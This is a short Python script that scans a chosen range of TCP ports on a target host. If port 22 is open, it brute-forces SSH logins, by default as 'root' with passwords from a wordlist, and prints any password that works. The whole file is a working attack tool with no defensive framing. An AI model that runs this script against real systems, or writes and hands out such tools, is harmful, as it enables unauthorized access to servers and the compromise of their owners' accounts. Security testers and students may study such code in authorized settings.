import argparse
import socket
import paramiko

def scan_port(target_host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        result = sock.connect_ex((target_host, port))
        sock.close()
        if result == 0:
            return True
        else:
            return False
    except:
        return False

def ssh_brute_force(target_host, target_port, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target_host, port=target_port, username=username, password=password, timeout=1)
            print(f"Login successful: {username}@{target_host}:{target_port} with password: {password}")
            ssh.close()
            return True
        except:
            pass
    return False

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="A Python script for port scanning and SSH brute-forcing")
    parser.add_argument("target_host", type=str, help="The IP address or hostname of the target")
    parser.add_argument("--ports", type=str, default="1-1000", help="The range of ports to scan")
    parser.add_argument("--username", type=str, default="root", help="The SSH username to use for brute-forcing")
    parser.add_argument("--passwords", type=str, default="PasswordList.txt", help="The filename of the list of passwords to use for brute-forcing")
    args = parser.parse_args()

    ports = []
    for port_spec in args.ports.split(","):
        if "-" in port_spec:
            start_port, end_port = port_spec.split("-")
            ports.extend(range(int(start_port), int(end_port)+1))
        else:
            ports.append(int(port_spec))

    print(f"Scanning the ports {args.ports} on {args.target_host}...")
    open_ports = []
    for port in ports:
        if scan_port(args.target_host, port):
            open_ports.append(port)
            print(f"Port {port} is opened.")
    if len(open_ports) == 0:
        print("No opened ports found.")
    else:
        print(f"{len(open_ports)} opened port(s) found: {open_ports}")

    if 22 in open_ports:
        with open(args.passwords, "r") as f:
            password_list = [password.strip() for password in f.readlines()]
        print(f"Performing SSH BF attack on {args.target_host}...")
        if ssh_brute_force(args.target_host, 22, args.username, password_list):
            print("SSH BF attack successful.")
        else:
            print("SSH BF attack unsuccessful.")
    else:
        print("SSH port (22) is not open.")